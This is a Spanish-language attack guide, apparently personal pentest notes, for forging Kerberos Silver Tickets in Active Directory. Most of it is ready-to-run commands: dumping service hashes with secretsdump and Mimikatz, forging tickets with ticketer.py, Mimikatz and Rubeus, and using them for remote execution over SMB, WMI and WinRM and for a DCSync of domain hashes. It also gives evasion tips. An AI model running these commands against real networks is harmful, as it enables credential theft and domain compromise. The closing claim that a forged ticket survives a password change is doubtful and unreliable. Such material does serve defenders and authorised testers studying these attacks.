## Silver Ticket Attack

El ataque Silver Ticket consiste en **forjar un ticket de servicio Kerberos (TGS)** sin pasar por el Domain Controller. Para ello solo se necesita el hash NT de la cuenta de servicio objetivo — no el hash de `krbtgt` como en el Golden Ticket.

### Silver Ticket vs Golden Ticket

| | Silver Ticket | Golden Ticket |
| --- | --- | --- |
| Hash necesario | Hash NT de la cuenta de servicio | Hash NT de `krbtgt` |
| Acceso otorgado | Solo el servicio objetivo | Todos los recursos del dominio |
| Pasa por el DC | ❌ No — el DC no valida el TGS | ❌ No — el DC no valida el TGT |
| Detectabilidad | Más difícil de detectar | Más fácil de detectar |
| Persistencia | Limitada al servicio | Total sobre el dominio |

### Prerrequisitos

- Hash NT (o clave AES) de la cuenta de servicio objetivo
- SID del dominio
- SPN del servicio objetivo
- Usuario a impersonar (normalmente `Administrator`)

> 💡 Usar claves AES en lugar del hash NT hace el ticket más difícil de detectar por soluciones de seguridad.

---

## Obtener los datos necesarios

### Hash NT de la cuenta de servicio

```shell
# Via secretsdump (si se tiene acceso al DC o admin local)
secretsdump.py '<dominio>/<usuario>:<contraseña>'@<ip_dc>
secretsdump.py '<dominio>/<usuario>'@<ip_dc> -just-dc-user '<cuenta_servicio>'

# Via Mimikatz (desde Windows)
privilege::debug
sekurlsa::logonpasswords        # extrae hashes de sesiones activas
lsadump::lsa /patch             # extrae hashes de la LSA
```

### SID del dominio

```shell
# Desde Linux
getPac.py -targetUser administrator '<dominio>/<usuario>:<contraseña>'

# Desde Windows con PowerView
Get-DomainSID

# Via lookupsid.py
lookupsid.py '<dominio>/<usuario>:<contraseña>'@<ip_dc> | grep "Domain SID"
```

### SPN del servicio objetivo

```shell
# Listar SPNs disponibles en el dominio
GetUserSPNs.py '<dominio>/<usuario>:<contraseña>' -dc-ip <ip_dc>

# Via PowerView
Get-DomainComputer <equipo> -Properties serviceprincipalname
```

---

## Servicios abusables con Silver Ticket

| SPN | Servicio | Acceso obtenido |
| --- | -------- | --------------- |
| `cifs/<equipo>` | SMB / Recursos compartidos | Acceso a archivos y ejecución remota |
| `http/<equipo>` | IIS / Web | Acceso a aplicaciones web |
| `mssql/<equipo>` | SQL Server | Consultas y ejecución de comandos SQL |
| `ldap/<dc>` | LDAP | Operaciones de directorio — DCSync |
| `host/<equipo>` | WinRM / tareas / servicios | Ejecución remota via WinRM |
| `wsman/<equipo>` | WinRM / PowerShell Remoting | Ejecución remota |
| `rpcss/<equipo>` | DCOM / WMI | Ejecución via WMI |

---

## Desde Linux (externamente — recomendado)

### Forjar el Silver Ticket con ticketer.py

```shell
# Con hash NT
ticketer.py -nthash <hash_nt_servicio> \
  -domain-sid <sid_dominio> \
  -domain <dominio> \
  -spn cifs/<equipo_objetivo>.<dominio> \
  administrator

# Con clave AES256 (más sigiloso)
ticketer.py -aesKey <clave_aes256> \
  -domain-sid <sid_dominio> \
  -domain <dominio> \
  -spn cifs/<equipo_objetivo>.<dominio> \
  administrator
```

Esto genera el archivo `administrator.ccache`.

### Usar el ticket

```shell
# Exportar el ticket al entorno
export KRB5CCNAME=$(pwd)/administrator.ccache

# Verificar el ticket
klist

# Acceso via SMB
smbclient //<equipo_objetivo>.<dominio>/C$ -k -no-pass
smbexec.py -k -no-pass '<dominio>/administrator'@<equipo_objetivo>.<dominio>

# Ejecución remota
psexec.py -k -no-pass '<dominio>/administrator'@<equipo_objetivo>.<dominio>
wmiexec.py -k -no-pass '<dominio>/administrator'@<equipo_objetivo>.<dominio>

# Acceso a MSSQL
mssqlclient.py -k -no-pass '<dominio>/administrator'@<equipo_objetivo>.<dominio>

# DCSync via LDAP Silver Ticket (forjar ticket para ldap/<dc>)
secretsdump.py -k -no-pass '<dominio>/administrator'@<dc>.<dominio>
```

---

## Desde Windows (internamente)

### Con Mimikatz

```powershell
# Forjar e inyectar el ticket directamente en la sesión (/ptt)
kerberos::golden /domain:<dominio> \
  /sid:<sid_dominio> \
  /rc4:<hash_nt_servicio> \
  /user:administrator \
  /service:cifs \
  /target:<equipo_objetivo>.<dominio> \
  /ptt

# Forjar y exportar a archivo
kerberos::golden /domain:<dominio> \
  /sid:<sid_dominio> \
  /rc4:<hash_nt_servicio> \
  /user:administrator \
  /service:cifs \
  /target:<equipo_objetivo>.<dominio> \
  /ticket:silver.kirbi

# Inyectar el ticket desde archivo
kerberos::ptt silver.kirbi

# Verificar
klist
```

### Con Rubeus

```powershell
# Forjar e inyectar el ticket
.\Rubeus.exe silver /rc4:<hash_nt_servicio> \
  /sid:<sid_dominio> \
  /domain:<dominio> \
  /user:administrator \
  /service:cifs/<equipo_objetivo>.<dominio> \
  /ptt

# Con clave AES256
.\Rubeus.exe silver /aes256:<clave_aes256> \
  /sid:<sid_dominio> \
  /domain:<dominio> \
  /user:administrator \
  /service:cifs/<equipo_objetivo>.<dominio> \
  /ptt
```

### Usar el ticket inyectado

```powershell
# Listar tickets en la sesión actual
klist

# Acceso a recursos compartidos
dir \\<equipo_objetivo>\C$
ls \\<equipo_objetivo>\C$

# Ejecución remota
Enter-PSSession -ComputerName <equipo_objetivo>
Invoke-Command -ComputerName <equipo_objetivo> -ScriptBlock { whoami }
```

---

## Caso especial — Silver Ticket sobre LDAP para DCSync

Si se tiene el hash NT de la cuenta de equipo del DC (`DC01$`), se puede forjar un Silver Ticket para el servicio `ldap` del DC y ejecutar DCSync sin necesitar credenciales de `Domain Admin`:

```shell
# Forjar ticket para LDAP del DC
ticketer.py -nthash <hash_nt_dc$> \
  -domain-sid <sid_dominio> \
  -domain <dominio> \
  -spn ldap/<dc>.<dominio> \
  administrator

export KRB5CCNAME=administrator.ccache

# Ejecutar DCSync via LDAP
secretsdump.py -k -no-pass '<dominio>/administrator'@<dc>.<dominio>
```

---

> 💡 El Silver Ticket es especialmente valioso para **persistencia sigilosa** — como no pasa por el DC, no genera eventos de autenticación en los logs del controlador de dominio. Si se tiene el hash de una cuenta de servicio, se puede forjar un ticket válido durante la vida útil del ticket (por defecto 30 días) incluso después de que la contraseña de la cuenta cambie, ya que el ticket ya está firmado.

---

### Referencias

- https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html
- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver
- https://notes.qazeer.io/active-directory/exploitation-kerberos_silver_tickets
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets
